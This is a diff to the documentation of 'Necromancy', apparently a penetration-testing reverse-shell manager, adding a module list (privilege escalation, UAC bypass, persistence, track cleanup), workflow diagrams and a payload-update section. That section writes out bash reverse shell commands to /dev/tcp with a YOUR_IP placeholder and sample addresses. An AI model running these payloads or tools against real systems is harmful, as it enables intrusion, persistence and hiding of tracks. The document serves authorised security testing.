@@ -37,6 +37,24 @@ necromancy/
 - **ModuleManager**: Registry and execution manager for modules
 - **Built-in Modules**: 13+ modules including PEASS, tunneling, escalation
 
+### Available Modules
+
+| Module | Description | Platform | Category |
+|--------|-------------|----------|----------|
+| **PEASS** | Privilege escalation awesome scripts suite | Linux/Windows | 🎯 Enumeration |
+| **Linux Exploit Suggester** | Automated exploit recommendations | Linux | ⚡ Exploitation |
+| **LSE** | Linux smart enumeration tool | Linux | 🎯 Enumeration |
+| **Potato Exploits** | Windows privilege escalation methods | Windows | 🔑 Privilege Escalation |
+| **Chisel** | Fast TCP/UDP tunnel over HTTP | Multi | 🚇 Tunneling |
+| **Ligolo** | Reverse proxy for penetration testing | Multi | 🚇 Tunneling |
+| **Ngrok** | Secure tunnel to localhost | Multi | 🚇 Tunneling |
+| **Meterpreter** | Upgrade to Metasploit sessions | Multi | 🚀 Session Upgrade |
+| **Cleanup** | Remove tracks and artifacts | Multi | 🧹 Cleanup |
+| **Traitor** | Automated Linux privilege escalation | Linux | 🔑 Privilege Escalation |
+| **UAC Bypass** | Windows UAC bypass techniques | Windows | 🔑 Privilege Escalation |
+| **Panix** | Linux persistence via systemd | Linux | 🕰️ Persistence |
+| **Memory Dump** | Process memory analysis | Linux | 🧠 Forensics |
+
 ### UI System (`ui/`)
 - **App**: Main application controller
 - **Menu System**: Interactive menu with keyboard shortcuts
@@ -91,35 +109,151 @@ go build -ldflags="-s -w -X main.Version=v1.2.0 -X main.BuildDate=$(date -u +%Y-
 ### Basic Reverse Shell Workflow
 ```mermaid
 graph TD
-    A[Start Necromancy] --> B[Configure Listener]
-    B --> C[Generate Payloads]
-    C --> D[Execute on Target]
-    D --> E[Receive Connection]
-    E --> F[Interactive Session]
-    F --> G[Execute Commands]
-    G --> H[File Operations]
-    H --> I[Module Execution]
+    subgraph "Penetration Tester"
+        A[👤 Attacker] -->|"Uses"| B[🧙‍♂️ Necromancy]
+    end
+    
+    subgraph "Target System"
+        C[🖥️ Target] -->|"Connects to"| D[🌐 Listener]
+        E[💻 Shell] -->|"Provides"| F[🔓 Access]
+    end
+    
+    B -->|"Configures"| G[⚙️ Listener Setup]
+    G -->|"Generates"| H[📄 Payloads]
+    H -->|"Executed on"| C
+    C -->|"Establishes"| I[🔗 Reverse Connection]
+    I -->|"Creates"| J[🎯 Interactive Session]
+    J -->|"Enables"| K[🛠️ Post-Exploitation]
+    K -->|"Includes"| L[📁 File Operations]
+    K -->|"Includes"| M[🔍 Module Execution]
+    
+    style A fill:#4CAF50,stroke:#2E7D32,color:#fff
+    style B fill:#9C27B0,stroke:#6A1B9A,color:#fff
+    style C fill:#FF5722,stroke:#D84315,color:#fff
+    style J fill:#2196F3,stroke:#1565C0,color:#fff
+    style K fill:#FFC107,stroke:#F57C00,color:#000
 ```
 
 ### File Manager Operations
 ```mermaid
-graph LR
-    A[File Manager] --> B[Navigate Directories]
-    B --> C[View Files]
-    C --> D[Download Files]
-    C --> E[Upload Files]
-    C --> F[Delete Files]
-    C --> G[Execute Files]
+graph TD
+    subgraph "User Interface"
+        A[👤 User] -->|"Opens"| B[📁 File Manager]
+    end
+    
+    subgraph "Navigation Operations"
+        B -->|"Browse"| C[📂 Directory Navigation]
+        B -->|"View"| D[📋 File Listing]
+    end
+    
+    subgraph "File Operations"
+        D -->|"Select"| E[📄 File Selection]
+        E -->|"Actions"| F[⚙️ File Actions]
+        
+        F -->|"Download"| G[⬇️ Download File]
+        F -->|"Upload"| H[⬆️ Upload File]
+        F -->|"Delete"| I[🗑️ Delete File]
+        F -->|"Execute"| J[▶️ Execute File]
+        F -->|"Edit"| K[✏️ Edit File]
+        F -->|"Copy"| L[📋 Copy File]
+    end
+    
+    subgraph "System Operations"
+        M[🆕 Create New] --> B
+        N[📊 Properties] --> E
+        O[🔍 Search] --> D
+    end
+    
+    style A fill:#4CAF50,stroke:#2E7D32,color:#fff
+    style B fill:#2196F3,stroke:#1565C0,color:#fff
+    style F fill:#FF9800,stroke:#F57C00,color:#000
+    style G fill:#8BC34A,stroke:#558B2F,color:#fff
+    style H fill:#8BC34A,stroke:#558B2F,color:#fff
+    style I fill:#F44336,stroke:#C62828,color:#fff
+    style J fill:#9C27B0,stroke:#6A1B9A,color:#fff
 ```
 
-### Network Information Flow
+### Network Information Flow & Payload Updates
 ```mermaid
 graph TD
-    A[Network Info] --> B[Detect Local IP]
-    B --> C[Check Public IP]
-    C --> D[Get Location Data]
-    D --> E[Display Results]
-    E --> F[Update Payloads]
+    subgraph "Network Detection Process"
+        A[🌐 Network Info System] -->|"Detects"| B[🏠 Local IP Detection]
+        B -->|"Queries"| C[🌍 Public IP Services]
+        C -->|"Retrieves"| D[📍 Location Data]
+        D -->|"Provides"| E[🎯 IP Information]
+    end
+    
+    subgraph "External Services"
+        F[☁️ IPify API] --> C
+        G[☁️ AWS CheckIP] --> C
+        H[☁️ IfConfig.me] --> C
+        I[☁️ ICanHazIP] --> C
+    end
+    
+    subgraph "Information Display"
+        J[📊 Network Interfaces] --> A
+        K[🗺️ Geographic Location] --> D
+        L[🏢 ISP Information] --> D
+    end
+    
+    subgraph "Payload Generation Process"
+        E -->|"Updates"| M[📝 Payload Templates]
+        M -->|"Replaces YOUR_IP with"| N[🎯 Actual IP Address]
+        N -->|"Generates"| O[📄 Updated Payloads]
+        
+        M --> P[⚙️ Bash Payload]
+        M --> Q[� Python Payload]
+        M --> R[🕸️ Netcat Payload]
+        M --> S[💎 PowerShell Payload]
+    end
+    
+    subgraph "Payload Types (Auto-Updated)"
+        O --> T[🔗 Reverse Shell Commands]
+        T --> U[🖥️ Linux/Unix Payloads]
+        T --> V[🪟 Windows Payloads]
+        T --> W[🐧 Cross-Platform Payloads]
+    end
+    
+    style A fill:#2196F3,stroke:#1565C0,color:#fff
+    style B fill:#4CAF50,stroke:#2E7D32,color:#fff
+    style C fill:#FF9800,stroke:#F57C00,color:#000
+    style D fill:#9C27B0,stroke:#6A1B9A,color:#fff
+    style E fill:#00BCD4,stroke:#00838F,color:#fff
+    style M fill:#795548,stroke:#4E342E,color:#fff
+    style N fill:#607D8B,stroke:#37474F,color:#fff
+    style O fill:#E91E63,stroke:#C2185B,color:#fff
+```
+
+### Payload Updates Feature Explanation
+
+The **Payload Updates** feature automatically updates generated payloads with real network information:
+
+1. **IP Detection**: Automatically detects local and public IP addresses
+2. **Port Configuration**: Uses configured listening ports instead of defaults
+3. **Template Replacement**: Replaces `YOUR_IP` with actual IP addresses
+4. **Multi-IP Support**: Prefers public IP when available, falls back to local IP
+5. **Real-time Updates**: Payloads refresh when network information changes
+
+#### Example Update Process:
+```bash
+# Before update (Template):
+bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
+
+# After update (with public IP):
+bash -i >& /dev/tcp/203.0.113.45/4444 0>&1
+
+# After update (with local IP only):
+bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
+```
+
+#### Supported Payload Types (Auto-Updated):
+- **🐚 Bash**: Traditional bash reverse shell
+- **🐍 Python**: Python with PTY support for full TTY
+- **🕸️ Netcat**: FIFO-based netcat reverse shell
+- **💎 PowerShell**: Windows PowerShell reverse shell
+- **🐘 PHP**: PHP reverse shell for web servers
+- **💎 Ruby**: Ruby reverse shell
+- **🐪 Perl**: Perl reverse shell
 ```
 
 ## 🐛 Common Issues & Solutions
